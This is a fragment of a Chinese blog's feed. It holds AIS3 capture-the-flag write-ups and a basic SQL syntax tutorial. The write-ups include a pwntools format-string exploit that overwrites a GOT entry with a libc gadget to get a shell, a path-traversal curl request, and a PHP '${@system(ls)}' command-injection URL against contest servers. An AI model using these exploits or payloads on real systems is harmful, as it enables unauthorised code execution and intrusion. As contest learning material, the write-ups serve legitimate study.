+port <span style="color:#f92672">=</span> <span style="color:#ae81ff">5521</span>
+
+<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+    r <span style="color:#f92672">=</span> remote(host, port)
+<span style="color:#66d9ef">else</span>:
+    r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./fmt&#39;</span>)
+
+main <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400646</span>
+start_main_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x21ab0</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe7</span>
+one_gadget <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10a38c</span>
+puts <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x601018</span>
+
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_fmt_payload</span>(value, target):
+    <span style="color:#66d9ef">global</span> num
+    num <span style="color:#f92672">=</span> num <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
+    <span style="color:#66d9ef">if</span> value <span style="color:#f92672">==</span> num:
+        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;&#39;</span>
+    <span style="color:#66d9ef">elif</span> value <span style="color:#f92672">&gt;</span> num:
+        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;%&#39;</span> <span style="color:#f92672">+</span> str(value<span style="color:#f92672">-</span>num) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;c&#39;</span> <span style="color:#f92672">+</span> target
+        num <span style="color:#f92672">=</span> value
+        <span style="color:#66d9ef">return</span> payload
+    <span style="color:#66d9ef">else</span>:
+        n <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span><span style="color:#f92672">-</span>num <span style="color:#f92672">+</span> value
+        num <span style="color:#f92672">=</span> value
+        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#39;%&#39;</span> <span style="color:#f92672">+</span> str(n) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;c&#39;</span> <span style="color:#f92672">+</span> target
+
+
+num <span style="color:#f92672">=</span> <span style="color:#ae81ff">73</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;startLeak:%39$p:%41$p:%43$p:%69$p&#39;</span>
+payload <span style="color:#f92672">+=</span> get_fmt_payload(<span style="color:#ae81ff">0x46</span>, <span style="color:#e6db74">&#39;%32$hhn&#39;</span>)
+payload <span style="color:#f92672">+=</span> get_fmt_payload(<span style="color:#ae81ff">0x06</span>, <span style="color:#e6db74">&#39;%33$hhn&#39;</span>)
+payload <span style="color:#f92672">+=</span> get_fmt_payload(<span style="color:#ae81ff">0x40</span>, <span style="color:#e6db74">&#39;%34$hhn&#39;</span>)
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%10000c</span><span style="color:#e6db74">&#39;</span>
+payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0xd0</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+payload <span style="color:#f92672">+=</span> p64(puts)
+payload <span style="color:#f92672">+=</span> p64(puts<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1</span>)
+payload <span style="color:#f92672">+=</span> p64(puts<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2</span>)
+
+r<span style="color:#f92672">.</span>sendline(payload)
+r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;startLeak:&#39;</span>)
+
+canary <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;:&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>)
+libc <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;:&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> start_main_offset
+ret_addr <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;:&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0xe0</span>
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;libc:&#39;</span>, hex(libc))
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;canary:&#39;</span>, hex(canary))
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;ret_addr:&#39;</span>, hex(ret_addr))
+
+
+gadget <span style="color:#f92672">=</span> libc<span style="color:#f92672">+</span>one_gadget
+
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;gadget:&#39;</span>, hex(gadget))
+num <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+payload <span style="color:#f92672">=</span> get_fmt_payload(gadget<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xff</span>, <span style="color:#e6db74">&#39;%32$hhn&#39;</span>)
+gadget <span style="color:#f92672">=</span> gadget <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span>
+payload <span style="color:#f92672">+=</span> get_fmt_payload(gadget<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xff</span>, <span style="color:#e6db74">&#39;%33$hhn&#39;</span>)
+gadget <span style="color:#f92672">=</span> gadget <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span>
+payload <span style="color:#f92672">+=</span> get_fmt_payload(gadget<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xff</span>, <span style="color:#e6db74">&#39;%34$hhn&#39;</span>)
+gadget <span style="color:#f92672">=</span> gadget <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span>
+payload <span style="color:#f92672">+=</span> get_fmt_payload(gadget<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xff</span>, <span style="color:#e6db74">&#39;%35$hhn&#39;</span>)
+gadget <span style="color:#f92672">=</span> gadget <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span>
+payload <span style="color:#f92672">+=</span> get_fmt_payload(gadget<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xff</span>, <span style="color:#e6db74">&#39;%36$hhn&#39;</span>)
+gadget <span style="color:#f92672">=</span> gadget <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span>
+payload <span style="color:#f92672">+=</span> get_fmt_payload(gadget<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xff</span>, <span style="color:#e6db74">&#39;%37$hhn&#39;</span>)
+gadget <span style="color:#f92672">=</span> gadget <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span>
+
+payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0xd0</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+payload <span style="color:#f92672">+=</span> p64(puts)
+payload <span style="color:#f92672">+=</span> p64(puts<span style="color:#f92672">+</span><span style="color:#ae81ff">0x1</span>)
+payload <span style="color:#f92672">+=</span> p64(puts<span style="color:#f92672">+</span><span style="color:#ae81ff">0x2</span>)
+payload <span style="color:#f92672">+=</span> p64(puts<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3</span>)
+payload <span style="color:#f92672">+=</span> p64(puts<span style="color:#f92672">+</span><span style="color:#ae81ff">0x4</span>)
+payload <span style="color:#f92672">+=</span> p64(puts<span style="color:#f92672">+</span><span style="color:#ae81ff">0x5</span>)
+payload <span style="color:#f92672">+=</span> p64(puts<span style="color:#f92672">+</span><span style="color:#ae81ff">0x6</span>)
+
+r<span style="color:#f92672">.</span>sendline(payload)
+
+r<span style="color:#f92672">.</span>interactive()
+</code></pre></div><hr>
+<h2 id="web">web</h2>
+<h3 id="secret-message100">Secret message/100</h3>
+<blockquote>
+<p>One secret person embeds a secret message in the website. Could you find the message?</p>
+<p><a href="http://srv02.ctf.ais3.org">http://srv02.ctf.ais3.org</a>:8887/</p>
+</blockquote>
+<p><img src="https://i.imgur.com/pThCerf.png" alt=""></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">potocol<span style="color:#f92672">=</span>GET
+
+i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+<span style="color:#66d9ef">while</span> <span style="color:#f92672">[</span> $i -lt <span style="color:#ae81ff">100</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">do</span>
+	
+	curl http://srv02.ctf.ais3.org:8887/ -i -X $potocol &gt;&gt; flags.txt 
+	potocol<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl http://srv02.ctf.ais3.org:8887/ -i -X $potocol | grep Next | cut -f <span style="color:#ae81ff">2</span> -d <span style="color:#e6db74">&#39; &#39;</span> | tr -d <span style="color:#e6db74">&#34;\r&#34;</span><span style="color:#66d9ef">)</span>
+
+	echo &gt;&gt; flags.txt 
+
+	i<span style="color:#f92672">=</span>$<span style="color:#f92672">[</span>$i+1<span style="color:#f92672">]</span>
+<span style="color:#66d9ef">done</span>
+</code></pre></div><p>然後我用手拼起來&hellip;</p>
+<h4 id="flag">Flag</h4>
+<pre><code>AIS3{HtTpMe5h0dI5FunaNdGo0DXDdDdDDDx!}
+</code></pre><hr>
+<h3 id="reverse-proxy200">Reverse proxy/200</h3>
+<blockquote>
+<p>Bob setup a simple reverse proxy, and configured some passwords.
+Unfortunately, he lost the password. Could you please help him to find it out?
+<a href="https://drive.google.com/file/d/1PbutKLTmobnLE8BeUWUUtLDBBd0iJOEk">http://ctf.ais3.org/files/web2_main.py</a></p>
+<p><a href="http://srv02.ctf.ais3.org">http://srv02.ctf.ais3.org</a>:8787/</p>
+</blockquote>
+<p>這題一開始有提供 python 的程式，可以把它執行起來，會比較好研究</p>
+<p>在程式中可以看到，編輯中</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">curl http://srv02.ctf.ais3.org:8787/%2e%2e/%2e%2e/%2e%2e/password/wa -X POST &gt; /dev/null
+curl http://srv02.ctf.ais3.org:8787/wa -X ADMIN -d <span style="color:#e6db74">&#39;QAQ&#39;</span>
+</code></pre></div><h4 id="flag-1">Flag</h4>
+<pre><code>AIS3{f1aSk_pr0Xy_5Erver_15_N1Ce!!}
+</code></pre><hr>
+<h3 id="invitation-letter300">Invitation letter/300</h3>
+<blockquote>
+<p>Customize your own invitation letter!</p>
+<p><a href="https://drive.google.com/file/d/1PcOLRUYwwu4-lXCAWACOq4dLY0FRoiC-">http://srv03.ctf.ais3.org:9002/</a></p>
+</blockquote>
+<p><img src="https://i.imgur.com/E51MKNP.png" alt=""></p>
+<p>==還沒解完==</p>
+<p>robots.txt
+<a href="http://srv03.ctf.ais3.org">http://srv03.ctf.ais3.org</a>:9002/robots.txt</p>
+<p><img src="https://i.imgur.com/CBWqoJ4.png" alt=""></p>
+<p>看起來是程式碼
+<a href="https://drive.google.com/file/d/1Ps9jmA5OSr8xCg1jRJnIIl2jxnxde56s">http://srv03.ctf.ais3.org:9002/files/app.py.old_20180531</a></p>
+<p>無法存取的 flag.txt
+<a href="http://srv03.ctf.ais3.org">http://srv03.ctf.ais3.org</a>:9002/files/flag.txt</p>]]></content></item><item><title>SQL 語法筆記</title><link>https://blackmaple.me/sql-tutorial/</link><pubDate>Wed, 31 Oct 2018 00:52:49 +0000</pubDate><guid>https://blackmaple.me/sql-tutorial/</guid><description>&lt;h2 id="基本語法">基本語法&lt;/h2>
+&lt;h3 id="創建資料表">創建資料表&lt;/h3>
+&lt;p>&lt;code>CREATE TABLE&lt;/code>&lt;/p>
+&lt;pre>&lt;code class="language-sql=" data-lang="sql=">CREATE TABLE table_name (
+column_1 data_type,
+column_2 data_type,
+column_3 data_type
+);
+&lt;/code>&lt;/pre>&lt;pre>&lt;code class="language-sql=" data-lang="sql=">CREATE TABLE celebs (
+id INTEGER,
+name TEXT,
+age INTEGER
+);
+&lt;/code>&lt;/pre>&lt;pre>&lt;code class="language-sql=" data-lang="sql=">CREATE TABLE celebs (
+id INTEGER PRIMARY KEY,
+name TEXT UNIQUE,
+date_of_birth TEXT NOT NULL,
+date_of_death TEXT DEFAULT 'Not Applicable',
+);
+&lt;/code>&lt;/pre>&lt;ol>
+&lt;li>
+&lt;p>&lt;code>PRIMARY KEY&lt;/code>：可用於資料的唯一識別，不能重複，一個資料只能有一個欄位是 &lt;code>PRIMARY KEY&lt;/code>。&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;code>UNIQUE&lt;/code>：與 &lt;code>PRIMARY KEY&lt;/code> 很像，不過它可以設置在一個資料的多個欄位&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;code>NOT NULL&lt;/code>：強制該欄位一定要給定值&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;code>DEFAULT&lt;/code>：如果欄位沒有值，會自動定預設值&lt;/p>
+&lt;/li>
+&lt;/ol></description><content type="html"><![CDATA[<h2 id="基本語法">基本語法</h2>
+<h3 id="創建資料表">創建資料表</h3>
+<p><code>CREATE TABLE</code></p>
+<pre><code class="language-sql=" data-lang="sql=">CREATE TABLE table_name (
+   column_1 data_type, 
+   column_2 data_type, 
+   column_3 data_type
+);
+</code></pre><pre><code class="language-sql=" data-lang="sql=">CREATE TABLE celebs (
+    id INTEGER,
+    name TEXT, 
+    age INTEGER
+);
+</code></pre><pre><code class="language-sql=" data-lang="sql=">CREATE TABLE celebs (
+   id INTEGER PRIMARY KEY, 
+   name TEXT UNIQUE,
+   date_of_birth TEXT NOT NULL,
+   date_of_death TEXT DEFAULT 'Not Applicable',
+);
+</code></pre><ol>
+<li>
+<p><code>PRIMARY KEY</code>：可用於資料的唯一識別，不能重複，一個資料只能有一個欄位是 <code>PRIMARY KEY</code>。</p>
+</li>
+<li>
+<p><code>UNIQUE</code>：與 <code>PRIMARY KEY</code> 很像，不過它可以設置在一個資料的多個欄位</p>
+</li>
+<li>
+<p><code>NOT NULL</code>：強制該欄位一定要給定值</p>
+</li>
+<li>
+<p><code>DEFAULT</code>：如果欄位沒有值，會自動定預設值</p>
+</li>
+</ol>
+<h3 id="刪除資料表">刪除資料表</h3>
+<p><code>DROP DATABASE</code></p>
+<pre><code class="language-sql=" data-lang="sql=">DROP DATABASE table_name;
+</code></pre><h3 id="新增資料">新增資料</h3>
+<p><code>INSERT INTO</code></p>
+<pre><code class="language-sql=" data-lang="sql=">INSERT INTO table_name (id, name, age)
+VALUES (1, 'Justin Bieber', 21);
+
+SELECT * FROM table_name;
+</code></pre><h3 id="資料表查詢">資料表查詢</h3>
+<p><code>SELECT</code></p>
+<pre><code class="language-sql=" data-lang="sql=">SELECT column_name FROM table_name;
+</code></pre><pre><code class="language-sql=" data-lang="sql=">SELECT * FROM table_name;
+</code></pre><h3 id="更新資料">更新資料</h3>
+<p><code>UPDATE</code></p>
+<pre><code class="language-sql=" data-lang="sql=">UPDATE celebs
+SET age = 22
+WHERE id = 1;
+</code></pre><h3 id="改變資料表欄位">改變資料表欄位</h3>
+<p><code>ALTER TABLE</code></p>
+<ul>
+<li>新增欄位
+<pre><code class="language-sql=" data-lang="sql=">ALTER TABLE celebs 
+ADD COLUMN twitter_handle TEXT;
+</code></pre></li>
+<li>刪除欄位
+<pre><code class="language-sql=" data-lang="sql=">ALTER TABLE celebs
+DROP COLUMN twitter_handle;
+</code></pre></li>
+<li>修改欄位
+<ul>
+<li>SQL Server / MS Access
+<pre><code class="language-sql=" data-lang="sql=">ALTER TABLE celebs
+ALTER COLUMN twitter_handle INTEGER;
+</code></pre></li>
+<li>My SQL / Oracle (prior version 10G)
+<pre><code class="language-sql=" data-lang="sql=">ALTER TABLE celebs
+MODIFY COLUMN twitter_handle INTEGER;
+</code></pre></li>
+<li>Oracle 10G and later
+<pre><code class="language-sql=" data-lang="sql=">ALTER TABLE celebs
+MODIFY twitter_handle INTEGER;
+</code></pre></li>
+</ul>
+</li>
+</ul>
+<h3 id="刪除資料">刪除資料</h3>
+<p><code>DELETE FROM</code></p>
+<pre><code class="language-sql=" data-lang="sql=">DELETE FROM celebs
+WHERE twitter_handle IS NULL;
+</code></pre><h2 id="進階查詢語法">進階查詢語法</h2>
+<h3 id="select"><code>SELECT</code></h3>
+<p>查詢結果顯示 name, genre, year</p>
+<pre><code class="language-sql=" data-lang="sql=">SELECT name, genre, year
+FROM movies;
+</code></pre><h3 id="as"><code>AS</code></h3>
+<p>可以改變查詢結果的欄位名稱，但不會改掉資料表裡的欄位</p>
+<pre><code class="language-sql=" data-lang="sql=">SELECT imdb_rating AS 'IMDb' 
+FROM movies;
+</code></pre><h3 id="select-distinct"><code>SELECT DISTINCT</code></h3>
+<p>去掉的重複的查詢結果</p>
+<ul>
+<li>去掉 year 重複的結果</li>
+</ul>
+<pre><code class="language-sql=" data-lang="sql=">SELECT DISTINCT year
+FROM movies;
+</code></pre><ul>
+<li>去掉 year 和 name 都重複的結果</li>
+</ul>
+<pre><code class="language-sql=" data-lang="sql=">SELECT DISTINCT year, name
+FROM movies;
+</code></pre><h3 id="where"><code>WHERE</code></h3>
+<p>篩選資料用的</p>
+<pre><code class="language-sql=" data-lang="sql=">SELECT *
+FROM movies
+WHERE year &gt; 2014;
+</code></pre><table>
+<thead>
+<tr>
+<th>運算子</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>=</td>
+<td>等於</td>
+</tr>
+<tr>
+<td>!=</td>
+<td>不等於</td>
+</tr>
+<tr>
+<td>&gt;</td>
+<td>大於</td>
+</tr>
+<tr>
+<td>&lt;</td>
+<td>小於</td>
+</tr>
+<tr>
+<td>&gt;=</td>
+<td>大於等於</td>
+</tr>
+<tr>
+<td>&lt;=</td>
+<td>小於等於</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>「等於」要特別注意，只有一個等號</p>
+</blockquote>
+<h3 id="like"><code>LIKE</code></h3>
+<p>可以在 <code>WHERE</code> 子句中使用 <code>LIKE</code> 運算子來進行模糊搜尋</p>
+<pre><code class="language-sql=" data-lang="sql=">SELECT *
+FROM movies
+WHERE name LIKE 'Se_en';
+</code></pre><blockquote>
+<p>_ 代表任意字元</p>
+</blockquote>
+<pre><code class="language-sql=" data-lang="sql=">SELECT * 
+FROM movies
+WHERE name LIKE 'A%';
+</code></pre><ul>
+<li><code>A%</code> 代表由 A 開頭</li>
+<li><code>%A</code> 代表由 A 結尾</li>
+<li><code>%man%</code> 代表所有含有 man 的字串</li>
+</ul>
+<h3 id="null"><code>NULL</code></h3>
+<p><code>NULL</code> 不能拿來用運算子進行比較，因此出現 <code>IS NULL</code>、<code>IS NOT NULL</code> 來判斷是否是 <code>NULL</code>。</p>
+<ul>
+<li>顯示具有 imdb_rating 的資料</li>
+</ul>
+<pre><code class="language-sql=" data-lang="sql=">SELECT name
+FROM movies 
+WHERE imdb_rating IS NOT NULL;
+</code></pre><h3 id="between"><code>BETWEEN</code></h3>
+<p>可以在 <code>WHERE</code> 子句中使用 <code>BETWEEN</code> 運算子來篩選出特定範圍區間得值</p>
+<p>篩選出 name 開頭為 &lsquo;A&rsquo;、&lsquo;B&rsquo;、&lsquo;C&rsquo; 的結果</p>
+<pre><code class="language-sql=" data-lang="sql=">SELECT *
+FROM movies
+WHERE name BETWEEN 'A' AND 'D';
+</code></pre><p>篩選出 year 在 1990 ~ 1999 區間的結果</p>
+<pre><code class="language-sql=" data-lang="sql=">SELECT *
+FROM movies
+WHERE year BETWEEN 1990 AND 1999;
+</code></pre><blockquote>
+<p><code>BETWEEN</code> 兩個字串，會不包含結尾
+<code>BETWEEN</code> 兩個數字，會包含結尾的數字</p>
+</blockquote>
+<h3 id="and"><code>AND</code></h3>
+<pre><code class="language-sql=" data-lang="sql=">SELECT * 
+FROM movies
+WHERE year BETWEEN 1990 AND 1999
+   AND genre = 'romance';
+</code></pre><p><img src="https://i.imgur.com/G4B1Tcj.png" alt=""></p>
+<h3 id="or"><code>OR</code></h3>
+<pre><code class="language-sql=" data-lang="sql=">SELECT *
+FROM movies
+WHERE genre = 'romance'
+	OR genre = 'comedy';
+</code></pre><p><img src="https://i.imgur.com/qRNYsa9.png" alt=""></p>
+<h3 id="order-by"><code>ORDER BY</code></h3>
+<p>用來排序結果</p>
+<blockquote>
+<p>如果 <code>WHERE</code> 存在，<code>ORDER BY</code> 永遠跟在 <code>WHERE</code> 後面</p>
+</blockquote>
+<ul>
+<li>DESC：從大道小排序</li>
+<li>ASC：從小到大排序（預設）</li>
+</ul>
+<h3 id="limit"><code>LIMIT</code></h3>
+<p>用來限制查詢結果數量</p>
+<pre><code class="language-sql=" data-lang="sql=">SELECT *
+FROM movies
+ORDER BY imdb_rating DESC
+LIMIT 3;
+</code></pre><blockquote>
+<p>永遠放在查詢語法最後面</p>
+</blockquote>
+<blockquote>
+<p>不是所有 RDBMS（關聯式資料庫管理系統） 都有</p>
+</blockquote>
+<h3 id="case"><code>CASE</code></h3>
+<p>SQL 中的判斷式，可以用在顯示結果加上新欄位</p>
+<blockquote>
+<p><code>CASE</code> 通常在 SELECT 語句中</p>
+</blockquote>
+<ul>
+<li><code>WHEN</code> 後面接著條件式，如果條件式為真，會返回 <code>THEN</code> 後面的字串</li>
+<li><code>ELSE</code> 會在前面條件式都不符合的時候，返回一個字串</li>
+<li><code>CASE</code> 結尾一定要有一個 END</li>
+<li>可以在 <code>END</code> 後面接 AS 來簡稱該條件的欄位名稱</li>
+</ul>
+<pre><code class="language-sql=" data-lang="sql=">SELECT name,
+    CASE
+        WHEN genre = 'romance' THEN 'Chill'
+        WHEN genre = 'comedy' THEN 'Chill'
+        ELSE 'Intense'
+    END AS 'Mood'
+FROM movies;
+</code></pre><h2 id="計算函式">計算函式</h2>
+<h3 id="count"><code>Count</code></h3>
+<p>計算指定欄位非空資料的總數</p>
+<pre><code class="language-sql=" data-lang="sql=">SELECT COUNT(*) 
+FROM fake_apps
+WHERE price = 0;
+</code></pre><h3 id="sum"><code>SUM</code></h3>
+<p>加總指定欄位的值</p>
+<pre><code class="language-sql=" data-lang="sql=">SELECT SUM(downloads)
+FROM fake_apps;
+</code></pre><h3 id="max--min"><code>MAX</code> / <code>MIN</code></h3>
+<p>求指定欄位的最大或最小值</p>
+<pre><code class="language-sql=" data-lang="sql=">SELECT MIN(downloads)
+FROM fake_apps;
+</code></pre><h3 id="average"><code>AVERAGE</code></h3>
+<p>求指定欄位的平均值</p>
+<pre><code class="language-sql=" data-lang="sql=">SELECT AVG(price)
+FROM fake_apps;
+</code></pre><h3 id="round"><code>ROUND</code></h3>
+<p>將指定資料四捨五入</p>
+<pre><code class="language-sql=" data-lang="sql=">SELECT ROUND(AVG(price), 2)
+FROM fake_apps;
+</code></pre><h2 id="彙總函式">彙總函式</h2>
+<h3 id="group-by"><code>GROUP BY</code></h3>
+<p>用來搭配 SELECT 語句，將指定欄位中，相同資料的放在一組，以便計算函式以組為單位進行計算</p>
+<blockquote>
+<p><code>GROUP BY</code> 會出現在 <code>WHERE</code> 之後，<code>ORDER BY</code> 和 <code>LIMIT</code> 之前</p>
+</blockquote>
+<pre><code class="language-sql=" data-lang="sql=">SELECT category, SUM(downloads) 
+FROM fake_apps
+GROUP BY category;
+</code></pre><p><code>GROUP BY</code> 後面的參數可以接數字，從 1 開始，分別代表 SELECT 後面的第幾個值</p>
+<pre><code class="language-sql=" data-lang="sql=">SELECT category, 
+   price,
+   AVG(downloads)
+FROM fake_apps
+GROUP BY 1, 2;
+</code></pre><p>以上面的例子來說，<code>GROUP BY</code> 後面的 1、2 分別指向 category 和 price</p>
+<h3 id="having"><code>HAVING</code></h3>
+<p>與 <code>WHERE</code> 類似，不過他是針對 Group</p>
+<blockquote>
+<p><code>HAVING</code> 會出現在 <code>GROUP BY</code> 之後，<code>ORDER BY</code> 和 <code>LIMIT</code> 之前</p>
+</blockquote>
+<pre><code class="language-sql=" data-lang="sql=">SELECT price, 
+   ROUND(AVG(downloads)),
+   COUNT(*)
+FROM fake_apps
+GROUP BY price
+HAVING COUNT(*) &gt; 10;
+</code></pre><h2 id="表格連接">表格連接</h2>
+<h3 id="join"><code>JOIN</code></h3>
+<p>使用方法：<code>JOIN</code> 表格名稱 <code>ON</code> 連接欄位規則</p>
+<blockquote>
+<p>連接後會自動補 <code>NULL</code></p>
+</blockquote>
+<pre><code class="language-sql=" data-lang="sql=">SELECT *
+FROM orders
+JOIN customers
+  ON orders.customer_id = customers.customer_id;
+
+</code></pre><h3 id="inner-join"><code>INNER JOIN</code></h3>
+<p>使用方法：<code>INNER JOIN</code> 表格名稱 <code>ON</code> 連接欄位規則</p>
+<blockquote>
+<p>會自動將不符合連接欄位規則的部分捨棄，如下圖</p>
+</blockquote>
+<p><img src="https://s3.amazonaws.com/codecademy-content/courses/learn-sql/multiple-tables/inner-join.gif" alt=""></p>
+<pre><code class="language-sql=" data-lang="sql=">SELECT COUNT(*)
+FROM newspaper
+JOIN online
+ON newspaper.id = online.id;
+</code></pre>]]></content></item><item><title>AIS3 2018 write-up</title><link>https://blackmaple.me/ais3-2018-write-up/</link><pubDate>Wed, 31 Oct 2018 00:49:29 +0000</pubDate><guid>https://blackmaple.me/ais3-2018-write-up/</guid><description>&lt;p>今年第二次參加 AIS3 pre-exam 的感想&lt;/p>
+&lt;ul>
+&lt;li>要用到程式解的地方滿多的&lt;/li>
+&lt;li>Web2 對網路環境不好的人會跑很久&lt;/li>
+&lt;li>Misc2 超多假 flag，要找到真的根本要通靈＝＝&lt;/li>
+&lt;/ul></description><content type="html"><![CDATA[<p>今年第二次參加 AIS3 pre-exam 的感想</p>
+<ul>
+<li>要用到程式解的地方滿多的</li>
+<li>Web2 對網路環境不好的人會跑很久</li>
+<li>Misc2 超多假 flag，要找到真的根本要通靈＝＝</li>
+</ul>
+<h2 id="web">Web</h2>
+<h3 id="1-warmup">1. warmup</h3>
+<ol>
+<li>
+<p>打開 <code>開發者工具</code>，可以看到 <code>response headers</code> 裡面有奇怪的 <code>Partial-Flag</code>
+<img src="https://i.imgur.com/rcEXreL.png" alt=""></p>
+</li>
+<li>
+<p>再看看網址列上有奇怪的參數，嘗試去改改看它，會發現 <code>partial flag</code> 跟著變了
+<img src="https://i.imgur.com/DQfYv70.png" alt=""></p>
+</li>
+<li>
+<p>再仔細觀察一下，發現前四個 <code>partial flag</code> 是 AIS3，所以可以知道 <code>partial flag</code> 組合起來就是這題的 <code>flag</code> 了。</p>
+</li>
+<li>
+<p>但這題 <code>flag</code> 有點長，所以我用 Python 來解</p>
+<pre><code class="language-python=" data-lang="python=">import requests
+for i in range(50):
+    r = requests.get(&quot;http://104.199.235.135:31331/index.php?p={}&quot;.format(i))
+    key = r.headers['Partial-Flag']
+    if key == '':
+        print(' ', end='')
+    else:
+        print(key, end='')
+</code></pre></li>
+</ol>
+<h3 id="2-hidden">2. hidden</h3>
+<ol>
+<li>
+<p>打開網頁就看到這行字
+<img src="https://i.imgur.com/5OJsVE0.png" alt=""></p>
+</li>
+<li>
+<p>因為看到上面顯示的文字，所以想到 secret page 可能藏在 <code>robots.txt</code> 裡
+<img src="https://i.imgur.com/uy25Pq8.png" alt=""></p>
+</li>
+<li>
+<p>進到 <code>_hidden_flag_.php</code> 頁面之後，發現還是沒有看到 <code>flag</code>。
+<img src="https://i.imgur.com/ZtBmkWv.png" alt=""></p>
+</li>
+<li>
+<p>打開 <code>開發者工具</code> 查看 HTML，發現按鈕會送出奇怪的 <code>form-data</code>。
+<img src="https://i.imgur.com/zz829Vy.png" alt=""></p>
+</li>
+<li>
+<p>按了幾次按鈕後，會發現 <code>c</code> 不斷的再增加， <code>s</code> 也跟著變
+<img src="https://i.imgur.com/dsAPbmV.png" alt=""></p>
+</li>
+<li>
+<p>透過 <code>開發者工具</code> 的看看 <code>response</code>，發現了奇怪的假 <code>flag</code>
+<img src="https://i.imgur.com/MxqkyK1.png" alt=""></p>
+</li>
+<li>
+<p>拿 Python 去跑跑看，跑到幾萬後會發現 <code>response</code> 的 <code>Flag</code> 變了，<code>flag</code> 就出來的</p>
+<pre><code class="language-python=" data-lang="python=">import requests
+from bs4 import BeautifulSoup
+payload = {'c': &quot;1&quot;, 's': '3241b876891b9ea67db897e940db6ea9e7e351447546b8da82bbf3693dfe9ebb'}
+while True:
+    r = requests.post('http://104.199.235.135:31332/_hidden_flag_.php', payload)
+    soup = BeautifulSoup(r.content, &quot;html.parser&quot;)
+    print(r.headers)
+    f = open('ans.txt', 'a')
+    f.write(str(r.headers)+&quot;\n&quot;)
+    if 'AIS3{NOT_A_VALID_FLAG}' not in str(r.headers):
+        break
+    c = soup.find(&quot;input&quot;, {&quot;name&quot;:'c'})['value']
+    s = soup.find(&quot;input&quot;, {&quot;name&quot;:'s'})['value']
+    payload = {'c': c, 's': s}    
+</code></pre></li>
+</ol>
+<h3 id="3-sushi">3. sushi</h3>
+<p>這題查了一下資料，嘗試很多次，最後發現考的好像是 <code>php double quote</code></p>
+<ol>
+<li>
+<p>可以印出當前檔案目錄</p>
+<pre><code>http://104.199.235.135:31333/?🍣=${@system(ls)}
+</code></pre><p><img src="https://i.imgur.com/rHdn9mO.png" alt=""></p>
+</li>
+<li>
